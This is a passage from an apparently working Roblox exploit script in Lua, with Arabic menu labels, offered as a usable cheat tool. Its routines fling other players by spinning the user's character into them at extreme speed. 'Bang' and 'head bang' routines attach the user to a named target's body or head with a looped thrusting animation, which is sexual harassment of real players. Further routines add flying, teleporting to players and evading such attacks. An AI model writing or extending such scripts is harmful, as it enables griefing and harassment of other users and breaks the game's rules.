                local root = char and char:FindFirstChild("HumanoidRootPart")
                if not root or not hum then return end

                if not _G.CuffProtectSavedSpeed or _G.CuffProtectSavedSpeed == 0 then
                    if hum.WalkSpeed > 0 then
                        _G.CuffProtectSavedSpeed = hum.WalkSpeed
                    end
                end
                hum.Sit = true

                local bv = root:FindFirstChild("CuffProtectBV")
                if not bv then
                    bv = Instance.new("BodyVelocity")
                    bv.Name = "CuffProtectBV"
                    bv.Velocity = Vector3.zero
                    bv.MaxForce = Vector3.new(1e5, 0, 1e5)
                    bv.Parent = root
                end

                local speed = (_G.CuffProtectSavedSpeed or 16)
                local cf = workspace.CurrentCamera.CFrame
                local fwd = Vector3.new(cf.LookVector.X, 0, cf.LookVector.Z)
                local rgt = Vector3.new(cf.RightVector.X, 0, cf.RightVector.Z)
                if fwd.Magnitude > 0 then fwd = fwd.Unit end
                if rgt.Magnitude > 0 then rgt = rgt.Unit end

                local vel = Vector3.zero

                local focusedBox = UserInputService:GetFocusedTextBox()
                if not focusedBox then
                    if UserInputService:IsKeyDown(Enum.KeyCode.W) then vel += fwd end
                    if UserInputService:IsKeyDown(Enum.KeyCode.S) then vel -= fwd end
                    if UserInputService:IsKeyDown(Enum.KeyCode.A) then vel -= rgt end
                    if UserInputService:IsKeyDown(Enum.KeyCode.D) then vel += rgt end
                end
                if isTouchDevice and hum.MoveDirection.Magnitude > 0 then
                    local md = hum.MoveDirection
                    vel += Vector3.new(md.X, 0, md.Z)
                end

                local isMoving = vel.Magnitude > 0
                if isMoving then
                    bv.Velocity = vel.Unit * speed
                    if _G.CuffProtectWalkTrack and not _G.CuffProtectWalkTrack.IsPlaying then
                        if _G.CuffProtectIdleTrack and _G.CuffProtectIdleTrack.IsPlaying then
                            _G.CuffProtectIdleTrack:Stop(0.15)
                        end
                        _G.CuffProtectWalkTrack:Play(0.15)
                    end
                else
                    bv.Velocity = Vector3.zero
                    if _G.CuffProtectIdleTrack and not _G.CuffProtectIdleTrack.IsPlaying then
                        if _G.CuffProtectWalkTrack and _G.CuffProtectWalkTrack.IsPlaying then
                            _G.CuffProtectWalkTrack:Stop(0.15)
                        end
                        _G.CuffProtectIdleTrack:Play(0.15)
                    end
                end
            end)
        end)
    else
        setButtonState(_G.CuffProtectBtn, false, T18T("ايقاف الحماية"), T18T("حماية كلبشة"), Theme.ButtonBlue, Theme.ButtonBlue)

        if _G.CuffProtectMoveConn then
            _G.CuffProtectMoveConn:Disconnect()
            _G.CuffProtectMoveConn = nil
        end
        pcall(function()
            if _G.CuffProtectIdleTrack then _G.CuffProtectIdleTrack:Stop() _G.CuffProtectIdleTrack = nil end
            if _G.CuffProtectWalkTrack then _G.CuffProtectWalkTrack:Stop() _G.CuffProtectWalkTrack = nil end
        end)
        pcall(function()
            local char = LocalPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root then
                local bv = root:FindFirstChild("CuffProtectBV")
                if bv then bv:Destroy() end
            end
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Sit = false
                hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            end
            local animS = char and char:FindFirstChild("Animate")
            if animS then animS.Disabled = false end
        end)
        _G.CuffProtectSavedSpeed = nil
    end
end)

T18_BANG_PROTECT_PULSE_TIME = 0.04
T18_BANG_PROTECT_REPEAT_DELAY = 0.05
T18_BANG_PROTECT_TARGET = Vector3.new(
    1595532131776632803093905408,
    8473378188257436287979487232,
    -40782583619653433808448913408
)
local _bangProtectSavedCFrame = nil

FlingBtn.MouseButton1Click:Connect(function()
    flingActive = not flingActive
    if flingActive then
        if isActive then stopBang() end
        if _HeadBang.active then stopHeadBang() end

        setButtonState(FlingBtn, true, T18T("الحماية شغالة"), T18T("حماية بانق"), Theme.Active, Theme.PanelSoft)

        task.spawn(function()
            while flingActive do
                local char = LocalPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")

                if root and root.Parent then
                    _bangProtectSavedCFrame = root.CFrame
                    root.CFrame = CFrame.new(T18_BANG_PROTECT_TARGET)
                    task.wait(T18_BANG_PROTECT_PULSE_TIME)

                    if flingActive and root.Parent then
                        root.CFrame = _bangProtectSavedCFrame
                    end
                    task.wait(T18_BANG_PROTECT_REPEAT_DELAY)
                else
                    task.wait(T18_BANG_PROTECT_REPEAT_DELAY)
                end
            end
        end)
    else
        setButtonState(FlingBtn, false, T18T("الحماية شغالة"), T18T("حماية بانق"), Theme.Active, Theme.PanelSoft)
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if root and _bangProtectSavedCFrame then
            pcall(function()
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
                root.CFrame = _bangProtectSavedCFrame
            end)
        end
        _bangProtectSavedCFrame = nil
    end
end)

function stopTargetFling(restorePosition)
    targetFlingActive = false
    local savedCFrame = _flingState.savedCFrame

    if targetFlingConnection then
        targetFlingConnection:Disconnect()
        targetFlingConnection = nil
    end

    if _flingState.angularVelocity then
        _flingState.angularVelocity:Destroy()
        _flingState.angularVelocity = nil
    end

    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChild("Humanoid")
    if hum then
        hum.AutoRotate = true
    end

    if root then
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
    end

    if restorePosition and savedCFrame then
        task.spawn(function()
            for _ = 1, 4 do
                local currentChar = LocalPlayer.Character
                local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
                if not currentRoot then
                    break
                end

                currentRoot.AssemblyLinearVelocity = Vector3.zero
                currentRoot.AssemblyAngularVelocity = Vector3.zero
                currentRoot.CFrame = savedCFrame
                RunService.Heartbeat:Wait()
            end
        end)
    end

    _flingState.savedCFrame = nil
    _flingState.angle = 0
    _flingState.pulse = 0
    _flingState.startTargetY = nil
    _flingState.startTime = 0
    setButtonState(TargetFlingBtn, false, T18T("ايقاف الفلنق"), T18T("فلنق"), Theme.Active, Theme.PanelSoft)
end

T18_FLING_ORBIT_SPEED = math.rad(220)
T18_FLING_SPIN_SPEED = 4200
T18_FLING_RADIUS = 1.25
T18_FLING_DEPTH = 0.55
T18_FLING_HEIGHT = -1.8
T18_FLING_SIDE_SPEED = 360
T18_FLING_UP_SPEED = 165

local function _t18WaitForTarget(target)
    if not target then return false end
    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        return true
    end
    showNotification(T18T(" جاري تحميل اللاعب..."))

    pcall(function()
        local tmpPart = Instance.new("Part")
        tmpPart.Anchored    = true
        tmpPart.CanCollide  = false
        tmpPart.Transparency = 1
        tmpPart.Size        = Vector3.new(1,1,1)
        tmpPart.Parent      = workspace
        LocalPlayer.ReplicationFocus = tmpPart
        task.delay(6, function() pcall(function() tmpPart:Destroy() end) end)
    end)
    local waited = 0
    while waited < 8 do
        task.wait(0.25)
        waited += 0.25
        if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            return true
        end
    end
    showNotification(T18T(" اللاعب بعيد جداً، حاول تقرب منه"))
    return false
end

function startTargetFling(target)
    if _T18BlockOwner(target) then return end
    if not _t18WaitForTarget(target) then return end
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChild("Humanoid")
    local targetChar = target and target.Character
    local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")

    if not root or not hum or not targetRoot then
        return
    end

    targetFlingActive = true
    _flingState.savedCFrame = root.CFrame
    _flingState.angle = 0
    _flingState.pulse = 0
    _flingState.startTargetY = targetRoot.Position.Y
    _flingState.startTime = tick()
    hum.AutoRotate = false

    _flingState.angularVelocity = Instance.new("BodyAngularVelocity")
    _flingState.angularVelocity.Name = "TargetFlingAngularVelocity"
    _flingState.angularVelocity.MaxTorque = Vector3.new(0, math.huge, 0)
    _flingState.angularVelocity.AngularVelocity = Vector3.new(0, T18_FLING_SPIN_SPEED, 0)
    _flingState.angularVelocity.P = 100000
    _flingState.angularVelocity.Parent = root

    setButtonState(TargetFlingBtn, true, T18T("ايقاف الفلنق"), T18T("فلنق"), Theme.Active, Theme.PanelSoft)

    targetFlingConnection = RunService.Heartbeat:Connect(function()
        if not targetFlingActive then
            return
        end

        local myChar = LocalPlayer.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        local myHum = myChar and myChar:FindFirstChild("Humanoid")
        local currentTargetChar = target.Character
        local currentTargetRoot = currentTargetChar and currentTargetChar:FindFirstChild("HumanoidRootPart")
        local currentTargetHum = currentTargetChar and currentTargetChar:FindFirstChildOfClass("Humanoid")

        if not myRoot or not myHum or myHum.Health <= 0 then
            return
        end
        if not currentTargetRoot or not currentTargetHum or currentTargetHum.Health <= 0 then

            return
        end

        _flingState.angle += T18_FLING_ORBIT_SPEED
        _flingState.pulse = (_flingState.pulse % 3) + 1

        local contactOffsets = {
            CFrame.new(0, T18_FLING_HEIGHT - 0.7, 0),
            CFrame.Angles(0, _flingState.angle, 0) * CFrame.new(T18_FLING_RADIUS, T18_FLING_HEIGHT, T18_FLING_DEPTH),
            CFrame.Angles(0, -_flingState.angle, 0) * CFrame.new(-T18_FLING_RADIUS, T18_FLING_HEIGHT, T18_FLING_DEPTH),
        }

        myRoot.CFrame = currentTargetRoot.CFrame * contactOffsets[_flingState.pulse]

        local lateralPush = currentTargetRoot.CFrame.RightVector * T18_FLING_SIDE_SPEED
        if _flingState.pulse == 3 then
            lateralPush = -lateralPush
        end

        myRoot.AssemblyLinearVelocity = lateralPush + Vector3.new(0, T18_FLING_UP_SPEED, 0)
    end)
end

function t18PlayLoopedDance(character, animationId, stateTable)
    if not character then
        return nil
    end

    local humanoid = character:WaitForChild("Humanoid", 5)
    if not humanoid then
        return nil
    end

    pcall(function()
        local animateScript = character:FindFirstChild("Animate")
        if animateScript then
            animateScript.Disabled = true
        end
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        humanoid:ChangeState(Enum.HumanoidStateType.Running)
    end)

    if stateTable and stateTable.animTrack then
        pcall(function()
            stateTable.animTrack:Stop()
        end)
        stateTable.animTrack = nil
    end

    local track = nil
    local success = pcall(function()
        local bundle = game:GetObjects(animationId)
        for _, obj in ipairs(bundle) do
            if obj:IsA("Animation") then
                track = humanoid:LoadAnimation(obj)
                track.Looped = true
                track.Priority = Enum.AnimationPriority.Action4
                track:Play(0.1, 1, 5)
                return
            end
        end
    end)

    if not success or not track then
        local animation = Instance.new("Animation")
        animation.AnimationId = animationId
        track = humanoid:LoadAnimation(animation)
        track.Looped = true
        track.Priority = Enum.AnimationPriority.Action4
        track:Play(0.1, 1, 5)
    end

    if stateTable then
        stateTable.animTrack = track
    end

    return track
end

function stopBang()
    isActive = false
    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
    end
    if bangRespawnConn then
        bangRespawnConn:Disconnect()
        bangRespawnConn = nil
    end
    if animTrack then
        animTrack:Stop()
        animTrack = nil
    end

    pcall(function()
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if root then
            local bv = root:FindFirstChild("BangProtectBV")
            if bv then bv:Destroy() end
        end
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.Sit = false
            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        end
        local animS = char and char:FindFirstChild("Animate")
        if animS then animS.Disabled = false end
    end)
    setButtonState(BangBtn, false, T18T("ايقاف"), T18T("بانق"), Theme.Active, Theme.PanelSoft)
end

function startBang(target)
    if _T18BlockOwner(target) then return end
    isActive = true
    setButtonState(BangBtn, true, T18T("ايقاف"), T18T("بانق"), Theme.Active, Theme.PanelSoft)

    local myChar = LocalPlayer.Character
    animTrack = t18PlayLoopedDance(myChar, "rbxassetid://5938365243", { animTrack = animTrack })

    local bangProtectSavedSpeed = nil
    local _bangAnimTick = 0

    followConnection = RunService.Heartbeat:Connect(function()
        if not isActive then return end

        local _bNow = tick()
        if _bNow - _bangAnimTick > 2 then
            _bangAnimTick = _bNow
            pcall(function()
                local _bChar = LocalPlayer.Character
                if _bChar and (not animTrack or not animTrack.IsPlaying) then
                    animTrack = t18PlayLoopedDance(_bChar, "rbxassetid://5938365243", { animTrack = animTrack })
                end
            end)
        end

        pcall(function()
            local myCharacter = LocalPlayer.Character
            local bangHum = myCharacter and myCharacter:FindFirstChildOfClass("Humanoid")
            local root = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
            if not root or not bangHum then return end

            if not bangProtectSavedSpeed or bangProtectSavedSpeed == 0 then
                if bangHum.WalkSpeed > 0 then
                    bangProtectSavedSpeed = bangHum.WalkSpeed
                end
            end
            bangHum.Sit = true

            local bv = root:FindFirstChild("BangProtectBV")
            if not bv then
                bv = Instance.new("BodyVelocity")
                bv.Name = "BangProtectBV"
                bv.Velocity = Vector3.zero
                bv.MaxForce = Vector3.new(1e5, 0, 1e5)
                bv.Parent = root
            end

            local speed = (bangProtectSavedSpeed or 16)
            local cf = workspace.CurrentCamera.CFrame
            local fwd = Vector3.new(cf.LookVector.X, 0, cf.LookVector.Z)
            local rgt = Vector3.new(cf.RightVector.X, 0, cf.RightVector.Z)
            if fwd.Magnitude > 0 then fwd = fwd.Unit end
            if rgt.Magnitude > 0 then rgt = rgt.Unit end

            local vel = Vector3.zero
            local focusedBox = UserInputService:GetFocusedTextBox()
            if not focusedBox then
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then vel += fwd end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then vel -= fwd end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then vel -= rgt end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then vel += rgt end
            end
            if isTouchDevice and bangHum.MoveDirection.Magnitude > 0 then
                local md = bangHum.MoveDirection
                vel += Vector3.new(md.X, 0, md.Z)
            end
            bv.Velocity = vel.Magnitude > 0 and vel.Unit * speed or Vector3.zero
        end)

        local myCharacter = LocalPlayer.Character
        local targetCharacter = target.Character
        if myCharacter and targetCharacter then
            local myRoot = myCharacter:FindFirstChild("HumanoidRootPart")
            local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
            if myRoot and targetRoot then
                myRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 1.5)
            end
        end
    end)

    bangRespawnConn = LocalPlayer.CharacterAdded:Connect(function(newChar)
        if not isActive then return end
        task.spawn(function()
            task.wait(0.5)
            if not isActive then return end
            animTrack = t18PlayLoopedDance(newChar, "rbxassetid://5938365243", { animTrack = animTrack })
            task.wait(1.5)
            if not isActive then return end
            if not animTrack or not animTrack.IsPlaying then
                animTrack = t18PlayLoopedDance(newChar, "rbxassetid://5938365243", { animTrack = animTrack })
            end
            task.wait(3.0)
            if not isActive then return end
            if not animTrack or not animTrack.IsPlaying then
                animTrack = t18PlayLoopedDance(newChar, "rbxassetid://5938365243", { animTrack = animTrack })
            end
        end)
    end)
end

BangBtn.MouseButton1Click:Connect(function()
    if isActive then
        stopBang()
        return
    end

    if _HeadBang.active then stopHeadBang() end
    if flingActive then flingActive = false; setButtonState(FlingBtn, false, T18T("الحماية شغالة"), T18T("حماية بانق"), Theme.Active, Theme.PanelSoft) end
    if targetFlingActive then stopTargetFling(true) end

    if not Input.Text or #Input.Text < 3 then return end
    if OwnerUsername:lower():find(Input.Text:lower(), 1, true) then _T18BlockOwnerName(OwnerUsername) return end
    local targetName = Input.Text
    local target = nil
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Name:lower() == targetName:lower() then
            target = player
            break
        end
    end

    if target then
        task.spawn(function()
            if _t18WaitForTarget(target) then startBang(target) end
        end)
    end
end)

function stopHeadBang()
    _HeadBang.active = false
    if _HeadBang.conn then
        _HeadBang.conn:Disconnect()
        _HeadBang.conn = nil
    end
    if _HeadBang.respawnConn then
        _HeadBang.respawnConn:Disconnect()
        _HeadBang.respawnConn = nil
    end
    if _HeadBang.animTrack then
        _HeadBang.animTrack:Stop()
        _HeadBang.animTrack = nil
    end
    pcall(function()
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.Sit = false
            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        end
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if root then
            local bv = root:FindFirstChild("HeadBangBV")
            if bv then bv:Destroy() end
        end
        local animS = char and char:FindFirstChild("Animate")
        if animS then animS.Disabled = false end
    end)
    setButtonState(HeadBangBtn, false, T18T("ايقاف"), T18T("هيد بانق"), Theme.Active, Theme.PanelSoft)
end

function startHeadBang(target)
    if _T18BlockOwner(target) then return end
    _HeadBang.active = true
    setButtonState(HeadBangBtn, true, T18T("ايقاف"), T18T("هيد بانق"), Theme.Active, Theme.PanelSoft)

    local myChar = LocalPlayer.Character
    _HeadBang.animTrack = t18PlayLoopedDance(myChar, "rbxassetid://120512834137418", _HeadBang)

    local savedSpeed = nil

    _HeadBang.respawnConn = LocalPlayer.CharacterAdded:Connect(function(newChar)
        if not _HeadBang.active then return end
        task.spawn(function()
            task.wait(0.5)
            if not _HeadBang.active then return end
            _HeadBang.animTrack = t18PlayLoopedDance(newChar, "rbxassetid://120512834137418", _HeadBang)
            task.wait(1.5)
            if not _HeadBang.active then return end
            if not _HeadBang.animTrack or not _HeadBang.animTrack.IsPlaying then
                _HeadBang.animTrack = t18PlayLoopedDance(newChar, "rbxassetid://120512834137418", _HeadBang)
            end
            task.wait(3.0)
            if not _HeadBang.active then return end
            if not _HeadBang.animTrack or not _HeadBang.animTrack.IsPlaying then
                _HeadBang.animTrack = t18PlayLoopedDance(newChar, "rbxassetid://120512834137418", _HeadBang)
            end
        end)
    end)

    local _hbAnimTick = 0
    _HeadBang.conn = RunService.Heartbeat:Connect(function()
        if not _HeadBang.active then return end

        local _hbNow = tick()
        if _hbNow - _hbAnimTick > 2 then
            _hbAnimTick = _hbNow
            pcall(function()
                local _hbChar = LocalPlayer.Character
                if _hbChar and (not _HeadBang.animTrack or not _HeadBang.animTrack.IsPlaying) then
                    _HeadBang.animTrack = t18PlayLoopedDance(_hbChar, "rbxassetid://120512834137418", _HeadBang)
                end
            end)
        end

        pcall(function()
            local myCharacter = LocalPlayer.Character
            local bangHum = myCharacter and myCharacter:FindFirstChildOfClass("Humanoid")
            local root = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
            if not root or not bangHum then return end

            if not savedSpeed or savedSpeed == 0 then
                if bangHum.WalkSpeed > 0 then savedSpeed = bangHum.WalkSpeed end
            end
            bangHum.Sit = true

            local bv = root:FindFirstChild("HeadBangBV")
            if not bv then
                bv = Instance.new("BodyVelocity")
                bv.Name = "HeadBangBV"
                bv.Velocity = Vector3.zero
                bv.MaxForce = Vector3.new(1e5, 0, 1e5)
                bv.Parent = root
            end

            local speed = (savedSpeed or 16)
            local cf = workspace.CurrentCamera.CFrame
            local fwd = Vector3.new(cf.LookVector.X, 0, cf.LookVector.Z)
            local rgt = Vector3.new(cf.RightVector.X, 0, cf.RightVector.Z)
            if fwd.Magnitude > 0 then fwd = fwd.Unit end
            if rgt.Magnitude > 0 then rgt = rgt.Unit end
            local vel = Vector3.zero
            local focusedBox = UserInputService:GetFocusedTextBox()
            if not focusedBox then
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then vel += fwd end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then vel -= fwd end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then vel -= rgt end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then vel += rgt end
            end
            if isTouchDevice and bangHum.MoveDirection.Magnitude > 0 then
                local md = bangHum.MoveDirection
                vel += Vector3.new(md.X, 0, md.Z)
            end
            bv.Velocity = vel.Magnitude > 0 and vel.Unit * speed or Vector3.zero
        end)

        local myCharacter = LocalPlayer.Character
        local targetCharacter = target.Character
        if myCharacter and targetCharacter then
            local myRoot = myCharacter:FindFirstChild("HumanoidRootPart")
            local targetHead = targetCharacter:FindFirstChild("Head")
            local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
            local pivot = targetHead or targetRoot
            if myRoot and pivot then

                local phase = math.floor(tick() / 0.1) % 2
                local zOff = phase == 0 and -1.0 or -1.45
                myRoot.CFrame = pivot.CFrame * CFrame.new(0, 1.95, zOff) * CFrame.Angles(0, math.pi, 0)
            end
        end
    end)
end

HeadBangBtn.MouseButton1Click:Connect(function()
    if _HeadBang.active then
        stopHeadBang()
        return
    end

    if isActive then stopBang() end
    if flingActive then flingActive = false; setButtonState(FlingBtn, false, T18T("الحماية شغالة"), T18T("حماية بانق"), Theme.Active, Theme.PanelSoft) end
    if targetFlingActive then stopTargetFling(true) end
    if not Input.Text or #Input.Text < 3 then return end
    if OwnerUsername:lower():find(Input.Text:lower(), 1, true) then _T18BlockOwnerName(OwnerUsername) return end
    local targetName = Input.Text
    local target = nil
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Name:lower() == targetName:lower() then
            target = player
            break
        end
    end
    if target then
        task.spawn(function()
            if _t18WaitForTarget(target) then startHeadBang(target) end
        end)
    end
end)

ResetBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if not char then
        return
    end

    local savedPos = nil
    local root = char:FindFirstChild("HumanoidRootPart")
    if root then
        savedPos = root.CFrame
    end

    respawnConnection = LocalPlayer.CharacterAdded:Connect(function(newChar)
        if not isActive then
            respawnConnection:Disconnect()
            return
        end
        task.wait(0.3)
        local newHum = newChar:FindFirstChildOfClass("Humanoid")
        if newHum then
            pcall(function()
                local anim = Instance.new("Animation")
                anim.AnimationId = "rbxassetid://5938365243"
                animTrack = newHum:LoadAnimation(anim)
                animTrack.Looped = true
                animTrack.Priority = Enum.AnimationPriority.Action4
                animTrack:Play(0.1, 1, 5)
            end)
        end
        task.wait(0.5)
        if savedPos then
            local newRoot = newChar:FindFirstChild("HumanoidRootPart")
            if newRoot then
                newRoot.CFrame = savedPos
            end
        end
    end)

    local hum = char:FindFirstChild("Humanoid")
    if hum then
        hum.Health = 0
    end
end)

function stopFly()
    flyActive = false
    if flyConnection then
        flyConnection:Disconnect()
        flyConnection = nil
    end

    local char = LocalPlayer.Character
    if char then
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            for _, obj in ipairs(root:GetChildren()) do
                if obj.Name == "FlyBV" or obj.Name == "FlyBG" then
                    obj:Destroy()
                end
            end
        end

        local hum = char:FindFirstChild("Humanoid")
        if hum then
            hum.PlatformStand = false
            hum.AutoRotate = true
        end
    end

    setButtonState(FlyBtn, false, T18T("ايقاف الطيران"), T18T("طيران"), Theme.Active, Theme.PanelSoft)
    if FlyTouchFrame then
        FlyTouchFrame.Visible = false
    end
    for key in pairs(mobileFlyInput) do
        mobileFlyInput[key] = false
    end
end

FlyBtn.MouseButton1Click:Connect(function()
    flyActive = not flyActive
    if flyActive then
        setButtonState(FlyBtn, true, T18T("ايقاف الطيران"), T18T("طيران"), Theme.Active, Theme.PanelSoft)
        if FlyTouchFrame and isTouchDevice then
            FlyTouchFrame.Visible = true
        end

        local char = LocalPlayer.Character
        if not char then
            flyActive = false
            if FlyTouchFrame then
                FlyTouchFrame.Visible = false
            end
            setButtonState(FlyBtn, false, T18T("ايقاف الطيران"), T18T("طيران"), Theme.Active, Theme.PanelSoft)
            return
        end

        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChild("Humanoid")
        if not root or not hum then
            flyActive = false
            if FlyTouchFrame then
                FlyTouchFrame.Visible = false
            end
            setButtonState(FlyBtn, false, T18T("ايقاف الطيران"), T18T("طيران"), Theme.Active, Theme.PanelSoft)
            return
        end

        hum.PlatformStand = not isTouchDevice
        hum.AutoRotate = false

        local bv = Instance.new("BodyVelocity")
        bv.Name = "FlyBV"
        bv.Velocity = Vector3.zero
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Parent = root

        local bg = Instance.new("BodyGyro")
        bg.Name = "FlyBG"
        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        bg.P = 90000
        bg.Parent = root

        flyConnection = RunService.Heartbeat:Connect(function()
            if not flyActive then
                return
            end

            local speed = tonumber(SpeedInput.Text) or 50
            local currentCamera = workspace.CurrentCamera
            if not currentCamera then
                return
            end
            local cf = currentCamera.CFrame
            local velocity = Vector3.zero

            if UserInputService:IsKeyDown(Enum.KeyCode.W) then
                velocity += cf.LookVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then
                velocity -= cf.LookVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then
                velocity -= cf.RightVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then
                velocity += cf.RightVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                velocity += Vector3.new(0, 1, 0)
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                velocity -= Vector3.new(0, 1, 0)
            end

            if mobileFlyInput.Forward then
                velocity += cf.LookVector
            end
            if mobileFlyInput.Backward then
                velocity -= cf.LookVector
            end
            if mobileFlyInput.Left then
                velocity -= cf.RightVector
            end
            if mobileFlyInput.Right then
                velocity += cf.RightVector
            end
            if mobileFlyInput.Up then
                velocity += Vector3.new(0, 1, 0)
            end
            if mobileFlyInput.Down then
                velocity -= Vector3.new(0, 1, 0)
            end

            if isTouchDevice and hum.MoveDirection.Magnitude > 0 then
                velocity += hum.MoveDirection
            end

            bv.Velocity = velocity * speed
            bg.CFrame = cf
        end)
    else
        stopFly()
    end
end)

workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(bindViewportListener)
task.defer(bindViewportListener)

function showSpectateWarning(message)
    if SpectateWarningLabel then
        SpectateWarningLabel.Text = message
        SpectateWarningLabel.Visible = true
        task.delay(3, function()
            if SpectateWarningLabel then
                SpectateWarningLabel.Visible = false
            end
        end)
    else
        warn(message)
    end
end

SavePlaceBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then
        warn("Cannot save location")
        return
    end

    if SavedLocation then
        root.CFrame = SavedLocation
        SavedLocation = nil
        setButtonState(SavePlaceBtn, false, T18T("رجوع للمكان"), T18T("حفظ مكاني"), Theme.Active, Theme.PanelSoft)
    else
        SavedLocation = root.CFrame
        setButtonState(SavePlaceBtn, true, T18T("رجوع للمكان"), T18T("حفظ مكاني"), Theme.Active, Theme.PanelSoft)
    end
end)

TeleportBtn.MouseButton1Click:Connect(function()
    local targetName = Input.Text
    local target = nil

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and #targetName >= 3 and player.Name:lower() == targetName:lower() then
            target = player
            break
        end
    end

    if target then
        task.spawn(function()
            if _t18WaitForTarget(target) then
                local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local tr = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                if root and tr then root.CFrame = tr.CFrame + Vector3.new(2,0,0) end
            end
        end)
    end
end)

function findTargetPlayer()
    local targetName = Input.Text
    if not targetName or #targetName < 3 then
        return nil
    end

    if _T18BlockOwnerName(targetName) then
        return nil
    end

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Name:lower() == targetName:lower() then
            return player
        end
    end

    return nil
end

function T18ShowPlayerToast(msg)
    do
        T18ShowToast(msg)
        return
    end
    local TweenService = game:GetService("TweenService")
    local toastGui = Instance.new("ScreenGui")
    toastGui.Name             = "T18PlayerToast"
    toastGui.ResetOnSpawn     = false
    toastGui.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
    toastGui.DisplayOrder     = 2147483647
    toastGui.IgnoreGuiInset   = true
    do
        local _cok = pcall(function() toastGui.Parent = game:GetService("CoreGui") end)
        if not _cok or not toastGui.Parent then toastGui.Parent = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui") end
    end
    local toast = Instance.new("Frame")
    toast.Name                = "ToastFrame"
    toast.AnchorPoint         = Vector2.new(1, 1)
    toast.Size                = UDim2.new(0, 230, 0, 64)
    toast.Position            = UDim2.new(1, 270, 1, -24)
    toast.BackgroundColor3    = Color3.fromRGB(10, 10, 10)
    toast.BackgroundTransparency = 0
    toast.BorderSizePixel     = 0
    toast.ZIndex              = 10
    toast.Parent              = toastGui
    local _tc = Instance.new("UICorner")
    _tc.CornerRadius = UDim.new(0, 10)
    _tc.Parent = toast
    local _ts = Instance.new("UIStroke")
    _ts.Color        = Color3.fromRGB(58, 58, 58)
    _ts.Thickness    = 1
    _ts.Transparency = 0
    _ts.Parent       = toast
    local accentBar = Instance.new("Frame")
    accentBar.Size             = UDim2.new(0, 3, 0.65, 0)
    accentBar.AnchorPoint      = Vector2.new(0, 0.5)
    accentBar.Position         = UDim2.new(0, 9, 0.5, 0)
    accentBar.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
    accentBar.BorderSizePixel  = 0
    accentBar.ZIndex           = 11
    accentBar.Parent           = toast
    local _ac = Instance.new("UICorner")
    _ac.CornerRadius = UDim.new(0, 4)
    _ac.Parent = accentBar
    local titleLbl = Instance.new("TextLabel")
    titleLbl.Size                 = UDim2.new(1, -28, 0, 22)
    titleLbl.Position             = UDim2.new(0, 20, 0, 8)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text                 = "R7L"
    titleLbl.TextColor3           = Color3.fromRGB(255, 255, 255)
    titleLbl.TextXAlignment       = Enum.TextXAlignment.Right
    titleLbl.Font                 = Enum.Font.GothamBold
    titleLbl.TextSize             = 14
    titleLbl.ZIndex               = 11
    titleLbl.Parent               = toast
    local msgLbl = Instance.new("TextLabel")
